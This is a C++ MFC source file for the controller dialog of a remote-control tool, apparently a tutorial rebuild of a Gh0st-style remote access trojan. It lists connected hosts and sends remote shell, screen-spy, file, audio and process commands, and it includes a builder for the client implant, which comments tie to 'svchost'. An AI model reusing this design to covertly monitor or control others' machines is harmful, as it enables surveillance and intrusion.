
// MyRemoteDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "MyRemote.h"
#include "MyRemoteDlg.h"
#include "afxdialogex.h"
#include "include/IOCPServer.h"
#include "CSettingDlg.h"
#include "..\common\macros.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif

//定义一种结构体，储存列的名称和宽度
typedef struct
{
	char* title;           //列表的名称
	int		nWidth;   //列表的宽度
}COLUMNSTRUCT;

//初始化列数据
COLUMNSTRUCT Array_Column_Online[] = {
	{"IP",				100	},
	{"区域",			200	},
	{"计算机名/备注",	210	},
	{"操作系统",		200	},
	{"CPU",				100	},
	{"摄像头",			100	},
	{"PING",			100	}
};

int a = 0;
COLUMNSTRUCT Array_Column_Message[] = {
	{"信息类型",		200	},
	{"时间",			400	},
	{"信息内容",	    600	}
};


//PC机信息结构体
typedef struct
{
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	int				CPUClockMhz;	// CPU主频
	IN_ADDR			IPAddress;		// 存储32位的IPv4的地址数据结构
	char			HostName[50];	// 主机名
	bool			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
}LOGININFO;

//两个列数据的长度
int Array_Column_Online_nums = 7;
int Array_Column_Message_nums = 3;

//初始化两个列的总宽度
int Column_Online_lenth = 0;
int Column_Message_lenth = 0;

//CIOCPServer类
CIOCPServer* m_iocpServer = NULL;


CMyRemoteDlg* g_pMyRemoteDlg = NULL;
// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CMyRemoteDlg 对话框



CMyRemoteDlg::CMyRemoteDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_MYREMOTE_DIALOG, pParent)
{
	//显示程序图标
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	//初始化链接个数为0
	Online_Pc_Count = 0;
	//初始化CMyRemoteDlg变量
	g_pMyRemoteDlg = this;

	if (((CMyRemoteApp*)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath("QQWry.Dat");
	}
}

void CMyRemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
	DDX_Control(pDX, IDC_STATIC_PICTUREUP, m_PicUp);
}

BEGIN_MESSAGE_MAP(CMyRemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CMyRemoteDlg::OnNMRClickOnline)
	ON_COMMAND(IDM_ONLINE_CMD, &CMyRemoteDlg::OnOnlineCmd)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CMyRemoteDlg::OnOnlineProcess)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CMyRemoteDlg::OnOnlineWindow)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CMyRemoteDlg::OnOnlineDesktop)
	ON_COMMAND(IDM_ONLINE_FILE, &CMyRemoteDlg::OnOnlineFile)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CMyRemoteDlg::OnOnlineVideo)
	ON_COMMAND(IDM_ONLINE_AUDIO, &CMyRemoteDlg::OnOnlineAudio)
	ON_COMMAND(IDM_ONLINE_SERVER, &CMyRemoteDlg::OnOnlineServer)
	ON_COMMAND(IDM_ONLINE_REGISTRY, &CMyRemoteDlg::OnOnlineRegistry)
	ON_COMMAND(IDM_ONLINE_DELETE, &CMyRemoteDlg::OnOnlineDelete)
	ON_COMMAND(IDM_MAIN_CLOSE, &CMyRemoteDlg::OnMainClose)
	ON_COMMAND(IDM_MAIN_ABOUT, &CMyRemoteDlg::OnMainAbout)
	ON_COMMAND(IDM_MAIN_SERVER_BUILD, &CMyRemoteDlg::OnMainServerBuild)
	ON_COMMAND(IDM_MAIN_SET, &CMyRemoteDlg::OnMainSet)
	//自定义消息
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify)  
	ON_MESSAGE(WM_ADDTOLIST, OnOnlineAddToList)        //OnAddToList
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)  //Shell 消息处理函数
	ON_MESSAGE(WM_OPENPROCESSDIALOG, OnOpenProcessDialog)  //进程管理 消息处理函数
	ON_MESSAGE(WM_OPENWINDOWSDIALOG, OnOpenWindowsDialog)  //窗口管理 消息处理函数
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)	//桌面屏幕管理 消息处理函数
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)        //文件管理
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)		//音频管理
	ON_MESSAGE(WM_OPENSERVERDIALOG, OnOpenServerDialog)		//服务管理



	ON_WM_CLOSE()
	ON_COMMAND(IDM_SYSTRAY_CLOSE, &CMyRemoteDlg::OnSystrayClose)
	ON_COMMAND(IDM_SYSTRAY_SHOW, &CMyRemoteDlg::OnSystrayShow)
END_MESSAGE_MAP()



// CMyRemoteDlg 消息处理程序

BOOL CMyRemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码


	//添加上面的图片
	Add_Up_Picture();
	//添加系统托盘
	Add_System_Tray();
	//添加功能图标按钮
	Add_ToolBar();
	//添加状态栏
	Add_status_bar();
	//显示主对话框菜单
	Add_Main_Menu();
	//初始化各种列。
	InitList();
	//添加背景图
	//Add_OnlineList_Background();
	//绑定socket端口
	ListenPort();
	//先初始化主窗口一次，这样也会触发WM_SIZE事件。
	CRect crect;
	GetWindowRect(&crect);
	crect.bottom += 20;
	MoveWindow(crect);
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CMyRemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CMyRemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CMyRemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CMyRemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	//用于窗口重绘，当WM_SIZE消息触发，就会进入此函数，然后传入主窗口的信息cx和cy，分别代表宽度和高度。
	CDialogEx::OnSize(nType, cx, cy);
	int i;
	double dcx = cx;

	 //TODO: 在此处添加消息处理程序代码

	//最小化了就返回
	if (SIZE_MINIMIZED == nType)
	{
		return;
	}

	if (m_CList_Online.m_hWnd != NULL)
	{
		//CRect 有很多内置函数，矩阵的坐标
		CRect rc;

		//基于主窗口的宽高度变换，修改List Control控件的矩阵大小。
		rc.left = 1;       //列表的左坐标
		rc.top = 80;       //列表的上坐标
		rc.right = cx - 1;  //列表的右坐标
		rc.bottom = cy - 200;  //列表的下坐标
		//重置列表控件的窗口大小
		m_CList_Online.MoveWindow(rc);

		//让每一列的宽度随主窗口的宽度而变化。
		for (i = 0; i < Array_Column_Online_nums; i++)
		{
			double dd = Array_Column_Online[i].nWidth;     //得到当前列的宽度
			dd /= Column_Online_lenth;                    //看一看当前宽度占总长度的几分之几
			dd *= dcx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int NewWidth = (int)dd;                                   //转换为int 类型
			m_CList_Online.SetColumnWidth(i, NewWidth);
		}
	}
	//同上
	if (m_CList_Message.m_hWnd != NULL)
	{
		CRect rc;
		rc.left = 1;        //列表的左坐标
		rc.top = cy - 200;    //列表的上坐标
		rc.right = cx - 1;    //列表的右坐标
		rc.bottom = cy - 20;  //列表的下坐标
		m_CList_Message.MoveWindow(rc);

		//让每一列的宽度随主窗口的宽度而变化。
		for (i = 0; i < Array_Column_Message_nums; i++)
		{
			double dd = Array_Column_Message[i].nWidth;     //得到当前列的宽度
			dd /= Column_Message_lenth;                    //看一看当前宽度占总长度的几分之几
			dd *= dcx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int NewWidth = (int)dd;                                   //转换为int 类型
			m_CList_Message.SetColumnWidth(i, NewWidth);
		}

		
	}

	//使状态栏跟随主窗口变化而变化
	if (m_StatusBar.m_hWnd != NULL)
	{
		CRect rc;
		rc.left = 0;
		rc.top = cy - 20;
		rc.right = cx;
		rc.bottom = cy;
		//调整状态栏的位置
		m_StatusBar.MoveWindow(rc);
		//设置为新的 ID、样式和宽度。
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_POPOUT, cx-10);
	}

	if (m_ToolBar.m_hWnd != NULL)              //工具条
	{
		CRect rc;
		rc.top = 0;
		rc.left = 300;
		rc.right = cx;
		rc.bottom = 80;
		m_ToolBar.MoveWindow(rc);     //设置工具条大小位置
	}


}



int CMyRemoteDlg::InitList()
{
	//点击时整个列都是选中状态
	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	//使用InsertColumn插入列,满足左对齐
	int i = 0;

	for (i = 0; i < Array_Column_Online_nums; i++)
	{
		m_CList_Online.InsertColumn(i, Array_Column_Online[i].title, LVCFMT_CENTER, Array_Column_Online[i].nWidth);
		Column_Online_lenth += Array_Column_Online[i].nWidth;
	}
	
	for (i = 0; i < Array_Column_Message_nums; i++)
	{
		m_CList_Message.InsertColumn(i, Array_Column_Message[i].title, LVCFMT_CENTER, Array_Column_Message[i].nWidth);
		Column_Message_lenth += Array_Column_Message[i].nWidth;
	}

	return 0;
}


// 添加上线机器的部分信息
void CMyRemoteDlg::Add_Online_Message(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing, ClientContext* pContext)
{
	m_CList_Online.InsertItem(0, strIP);//先插入第一个子列的信息，默认都是第一行，也就是第一项，确保每当有新设备上线，总是在第一行。

	//为其他子列添加数据，这里使用了枚举变量，在简化代码的同时，也能更好的扩展
	m_CList_Online.SetItemText(0, ONLINELIST_ADDR, strAddr);
	m_CList_Online.SetItemText(0, ONLINELIST_COMPUTER_NAME, strPCName); 
	m_CList_Online.SetItemText(0, ONLINELIST_OS, strOS);
	m_CList_Online.SetItemText(0, ONLINELIST_CPU, strCPU);
	m_CList_Online.SetItemText(0, ONLINELIST_VIDEO, strVideo);
	m_CList_Online.SetItemText(0, ONLINELIST_PING, strPing);
	m_CList_Online.SetItemData(0, (DWORD)pContext);
	//添加上线日志
	Add_Log_Message(true, strIP + "主机上线");
}


//添加日志的部分信息
void CMyRemoteDlg::Add_Log_Message(BOOL IsSuccess, CString strLogMsg)
{
	CString strTime, strIsSuccess;

	//获取当前时间
	CTime t = CTime::GetCurrentTime();
	strTime = t.Format("%H:%M:%S");
	if (IsSuccess)
	{
		strIsSuccess = "Success";
	}
	else
	{
		strIsSuccess = "Failed";
		
	}
	m_CList_Message.InsertItem(0, strIsSuccess);
	m_CList_Message.SetItemText(0, 1, strTime);
	m_CList_Message.SetItemText(0, 2, strLogMsg);

	CString strStatusMsg;
	if (strLogMsg.Find("上线") > 0)         //处理上线还是下线消息
	{
		Online_Pc_Count++;
	}
	else if (strLogMsg.Find("下线") > 0)
	{
		Online_Pc_Count--;
	}
	else if (strLogMsg.Find("断开") > 0)
	{
		Online_Pc_Count--;
	}
	Online_Pc_Count = (Online_Pc_Count <= 0 ? 0 : Online_Pc_Count);         //防止iCount 有-1的情况
	strStatusMsg.Format("有%d个主机在线", Online_Pc_Count);
	m_StatusBar.SetPaneText(0, strStatusMsg);   //在状态条上显示文字
	
}


//// 测试是否能正常添加信息。
//void CMyRemoteDlg::test()
//{
//	Add_Online_Message("192.168.0.1", "本机局域网", "Lang", "Windows7", "2.2GHZ", "有", "123232");
//	Add_Online_Message("192.168.0.2", "本机局域网", "Lang", "Windows7", "2.2GHZ", "有", "123232");
//	Add_Online_Message("192.168.0.3", "本机局域网", "Lang", "Windows7", "2.2GHZ", "有", "123232");
//}

//Online列表界面内右键显示菜单栏
void CMyRemoteDlg::OnNMRClickOnline(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu	Menu;//声明一个菜单变量
	Menu.LoadMenuA(IDR_MENU_ONLINE);//载入菜单资源
	CMenu* pMenu = Menu.GetSubMenu(0);//得到菜单项
	int M_count = pMenu->GetMenuItemCount();//得到菜单各个选项的个数

	CPoint	Point;                           //声明一个鼠标变量
	GetCursorPos(&Point);                    //得到鼠标指针的位置

	//满足选中列表中的项数为0，项数可以理解为行数，就将菜单中的选项全部变灰，无法点击。
	if (m_CList_Online.GetSelectedCount() == 0)
	{
		for (int i = 0; i < M_count; i++)
		{
			//EnableMenuItem,启用、禁用或显示指定的菜单项。
			pMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
		}
	}

	//根据鼠标的位置来展示菜单栏
	pMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);
	*pResult = 0;
}




//终端管理
void CMyRemoteDlg::OnOnlineCmd()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("终端管理");
	BYTE	bToken = COMMAND_SHELL;              //lang4.2.1        向服务端发送一个COMMAND_SHELL命令  到svchost中搜之
	SendSelectCommand(&bToken, sizeof(BYTE));
}


//lang4.2打开终端管理窗口
LRESULT CMyRemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	//这里定义远程终端的对话框，转到远程终端的CShellDlg类的定义  先查看对话框界面后转到OnInitDialog
	CShellDlg* dlg = new CShellDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

//进程管理
void CMyRemoteDlg::OnOnlineProcess()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("进程管理");
	BYTE	bToken = COMMAND_PROCESS;              //lang4.2.1        向服务端发送一个COMMAND_PROCESS命令  到svchost中搜之
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CMyRemoteDlg::OnOpenProcessDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CProcessDlg* dlg = new CProcessDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg

	// 设置父窗口为卓面
	dlg->Create(IDD_PROCESS, GetDesktopWindow());      //创建对话框
	dlg->ShowWindow(SW_SHOW);                      //显示对话框

	pContext->m_Dialog[0] = PROCESS_DLG;              //这个值用做服务端再次发送数据时的标识
	pContext->m_Dialog[1] = (int)dlg;
	//先看一下这个对话框的界面再看这个对话框类的构造函数
	return 0;
}


//窗口管理
void CMyRemoteDlg::OnOnlineWindow()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("窗口管理");

	BYTE	bToken = COMMAND_WINDOWS;              //lang4.2.1        向服务端发送一个COMMAND_WINDOWS命令  到svchost中搜之
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CMyRemoteDlg::OnOpenWindowsDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CWindowsDlg* dlg = new CWindowsDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg

	// 设置父窗口为卓面
	dlg->Create(IDD_WINDOWS, GetDesktopWindow());      //创建对话框
	dlg->ShowWindow(SW_SHOW);                      //显示对话框

	pContext->m_Dialog[0] = WINDOWS_DLG;              //这个值用做服务端再次发送数据时的标识
	pContext->m_Dialog[1] = (int)dlg;
	//先看一下这个对话框的界面再看这个对话框类的构造函数
	return 0;
}


//视频管理
void CMyRemoteDlg::OnOnlineVideo()
{
	// TODO: 在此添加命令处理程序代码
	MessageBox("视频管理");
}


//桌面管理
void CMyRemoteDlg::OnOnlineDesktop()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("桌面管理");
	BYTE	bToken = COMMAND_SCREEN_SPY;  //向服务端发送COMMAND_SCREEN_SPY CKernelManager::OnReceive搜之
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CMyRemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;

	CScreenSpyDlg* dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


//文件管理
void CMyRemoteDlg::OnOnlineFile()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("文件管理");
	BYTE	bToken = COMMAND_LIST_DRIVE;            // 服务端中COMMAND_LIST_DRIVE
	SendSelectCommand(&bToken, sizeof(BYTE));

}

//打开文件管理窗口
LRESULT CMyRemoteDlg::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext* pContext = (ClientContext*)lParam;

	//转到CFileManagerDlg  构造函数
	CFileManagerDlg* dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为桌面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}



//音频管理
void CMyRemoteDlg::OnOnlineAudio()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("音频管理");
	BYTE	bToken = COMMAND_AUDIO;                 //向服务端发送命令 服务端中搜索
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CMyRemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CAudioDlg* dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

//服务管理
void CMyRemoteDlg::OnOnlineServer()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_SERVICES;         //赋值一个宏 然后发送到服务端，到服务端搜索COMMAND_SYSTEM
	SendSelectCommand(&bToken, sizeof(BYTE));
	//MessageBox("服务管理");
}


LRESULT CMyRemoteDlg::OnOpenServerDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CServerDlg* dlg = new CServerDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg

	// 设置父窗口为卓面
	dlg->Create(IDD_SERVERDLG, GetDesktopWindow());      //创建对话框
	dlg->ShowWindow(SW_SHOW);                      //显示对话框

	pContext->m_Dialog[0] = SERVER_DLG;              //这个值用做服务端再次发送数据时的标识
	pContext->m_Dialog[1] = (int)dlg;
	//先看一下这个对话框的界面再看这个对话框类的构造函数
	return 0;
}

//注册表管理
void CMyRemoteDlg::OnOnlineRegistry()
{
	// TODO: 在此添加命令处理程序代码
	MessageBox("注册表管理");
}

//断开连接
void CMyRemoteDlg::OnOnlineDelete()
{
	// TODO: 在此添加命令处理程序代码

	//删除所有项
	////获取列表中所有项的个数
	//int All_Count = m_CList_Online.GetItemCount();
	//int i;
	////循环删除，每次都删除第一行，因为没删除一行，索引是会变的。
	//for (i = 0; i < All_Count; i++)
	//{
	//	m_CList_Online.DeleteItem(0);
	//}

	//删除选定项
	CString strIp;
	int index= m_CList_Online.GetSelectionMark();
	//Ip信息必须在这一行删除之前获取
	strIp = m_CList_Online.GetItemText(index, ONLINELIST_IP);
	m_CList_Online.DeleteItem(index);

	//添加日志消息
	strIp += "断开连接";
	Add_Log_Message(true, strIp);
}

//为主对话窗口添加菜单
void CMyRemoteDlg::Add_Main_Menu()
{
	// TODO: 在此处添加实现代码.
	HMENU	Main_Menu;//声明一个菜单句柄
	Main_Menu=LoadMenuA(NULL, MAKEINTRESOURCE(IDR_MENU_MAIN));//载入菜单资源，使用MAKEINTRESOURCE宏转类型
	::SetMenu(this->GetSafeHwnd(), Main_Menu);  //使用::代表不使用类中的重载函数。 分配新菜单到主对话框窗口
	::DrawMenuBar(this->GetSafeHwnd());  //显示菜单
}

//退出选项处理函数
void CMyRemoteDlg::OnMainClose()
{
	// TODO: 在此添加命令处理程序代码

	//向主窗口发送WM_CLOSE消息，造成程序关闭
	PostMessage(WM_CLOSE, 0, 0);
}


//关于选项处理函数
void CMyRemoteDlg::OnMainAbout()
{
	// TODO: 在此添加命令处理程序代码
	//调用已有的关于函数
	CAboutDlg AboutDlg;
	AboutDlg.DoModal();
}

//生成服务端
void CMyRemoteDlg::OnMainServerBuild()
{
	// TODO: 在此添加命令处理程序代码
	CCreatServerDlg CreatServerDlg;
	CreatServerDlg.DoModal();
	//MessageBox("生成服务端");
}

//参数设置
void CMyRemoteDlg::OnMainSet()
{
	// TODO: 在此添加命令处理程序代码
	CSettingDlg SettingDlg;
	SettingDlg.DoModal();
}

static UINT indicators[] = { 
	IDR_STATUSBAR_STRING 
};


//添加状态栏
void CMyRemoteDlg::Add_status_bar()
{
	// TODO: 在此处添加实现代码.
	if (!m_StatusBar.Create(this) || !m_StatusBar.SetIndicators(indicators, sizeof(indicators) / sizeof(UINT)))
	{
		TRACE0("Can't create status bar\n");
		return ;
	}
	CRect rc;
	//检索状态栏的边界矩形的尺寸。
	::GetWindowRect(m_StatusBar.m_hWnd, rc);
	//调整状态栏的位置和大小，但是实际上我们调用的是重载函数，实际上具体调整在Onsize函数中实现
	m_StatusBar.MoveWindow(rc);
}

//添加功能图标
void CMyRemoteDlg::Add_ToolBar()
{
	// TODO: 在此处添加实现代码.

	//创造并加载工具栏
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))
	{
		TRACE0("Failed to create toolbar\n");
		return;      // fail to create
	}
	m_ToolBar.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP

	//TrueColorToolBar.h提供的函数，用来分割BITMAP，并上色，否则就根本没有显示
	m_ToolBar.LoadTrueColorToolBar
	(
		48,    //加载真彩工具条
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN
	);

	//初始化工具栏位置
	RECT rt, rtMain;
	GetWindowRect(&rtMain);
	rt.left = 0;
	rt.top = 0;
	rt.bottom = 80;
	rt.right = rtMain.right - rtMain.left +200;
	m_ToolBar.MoveWindow(&rt, TRUE);

	//给工具栏下面附加文字
	m_ToolBar.SetButtonText(0, "终端管理");
	m_ToolBar.SetButtonText(1, "进程管理");
	m_ToolBar.SetButtonText(2, "窗口管理");
	m_ToolBar.SetButtonText(3, "桌面管理");
	m_ToolBar.SetButtonText(4, "文件管理");
	m_ToolBar.SetButtonText(5, "语音管理");
	m_ToolBar.SetButtonText(6, "视频管理");
	m_ToolBar.SetButtonText(7, "服务管理");
	m_ToolBar.SetButtonText(8, "注册表管理");
	//中间空一格
	m_ToolBar.SetButtonText(10, "参数设置");
	m_ToolBar.SetButtonText(11, "生成服务端");
	m_ToolBar.SetButtonText(12, "帮助");

	//显示工具栏
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);
}




// 添加系统托盘
void CMyRemoteDlg::Add_System_Tray()
{
	// TODO: 在此处添加实现代码.
	NotifIconDate.cbSize = sizeof(NOTIFYICONDATA);
	NotifIconDate.hWnd = this->m_hWnd;
	NotifIconDate.uID = IDR_MAINFRAME;     //图标的ID，就用程序原本的那个
	NotifIconDate.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;   //托盘所拥有的状态，消息窗口，图标，气泡都有效
	NotifIconDate.uCallbackMessage = UM_ICONNOTIFY;            //回调消息，需要自己设置，用来处理一些系统托盘的一些消息
	NotifIconDate.hIcon = m_hIcon;                            //icon 变量，在项目生成时已经有了
	CString str = "MyRemote远程协助软件";       //气泡提示字符串
	lstrcpyn(NotifIconDate.szTip, (LPCSTR)str, sizeof(NotifIconDate.szTip) / sizeof(NotifIconDate.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &NotifIconDate);   //显示托盘
	
}
//系统托盘菜单的消息处理函数
void CMyRemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
{
	switch ((UINT)lParam)
	{
		case WM_LBUTTONDOWN: // 按下鼠标左键
			SetForegroundWindow();
			ShowWindow(SW_SHOWNORMAL);
			break;
		case WM_RBUTTONDOWN: // 点击右键，弹出设置好的菜单
			CMenu	Menu;//声明一个菜单变量
			Menu.LoadMenu(IDR_MENU_SYSTRAY);//载入菜单资源
			CMenu* pMenu = Menu.GetSubMenu(0);//得到菜单项
			CPoint point;
			GetCursorPos(&point);

			pMenu->TrackPopupMenu(TPM_LEFTBUTTON | TPM_RIGHTBUTTON,point.x, point.y, this, NULL);
			PostMessage(WM_USER, 0, 0);
			break;
	}
}

//主窗口退出时，系统托盘图标消失
void CMyRemoteDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	Shell_NotifyIcon(NIM_DELETE, &NotifIconDate);   //显示托盘
	CDialogEx::OnClose();
}


void CMyRemoteDlg::OnSystrayClose()
{
	// TODO: 在此添加命令处理程序代码
	PostMessage(WM_CLOSE, 0, 0);
}


void CMyRemoteDlg::OnSystrayShow()
{
	// TODO: 在此添加命令处理程序代码
	ShowWindow(SW_SHOWNORMAL);
}


// 在工具栏左边添加一个图片
void CMyRemoteDlg::Add_Up_Picture()
{
	// TODO: 在此处添加实现代码.
	CRect rc;
	rc.right = 300;
	rc.left = 0;
	rc.top = 0;
	rc.bottom = 80;

	m_PicUp.MoveWindow(rc);

	m_BitmapPicUp.LoadBitmap(IDB_BITMAP_PICTUREUP);

	m_PicUp.ModifyStyle(0xF, SS_BITMAP | SS_CENTERIMAGE);
	m_PicUp.SetBitmap(m_BitmapPicUp);

}

// 添加OnlineList控件的背景图
void CMyRemoteDlg::Add_OnlineList_Background()
{
	//TODO: 在此处添加实现代码.
	AfxOleInit();

	TCHAR szBuffer[_MAX_PATH];
	VERIFY(::GetModuleFileName(AfxGetInstanceHandle(), szBuffer, _MAX_PATH));
	CString sPath = (CString)szBuffer;
	sPath = sPath.Left(sPath.ReverseFind('\\') +1);
	sPath += "res\\OnlineList_Pic.png";
	m_CList_Online.SetBkImage(sPath.GetBuffer(sPath.GetLength()), TRUE);   
	m_CList_Message.SetBkImage(sPath.GetBuffer(sPath.GetLength()), TRUE);
	sPath.ReleaseBuffer();

	m_CList_Online.SetTextBkColor(CLR_NONE);
	m_CList_Message.SetTextBkColor(CLR_NONE);

}


//NotifyProc是这个socket内核的核心  所有的关于socket 的处理都要调用这个函数
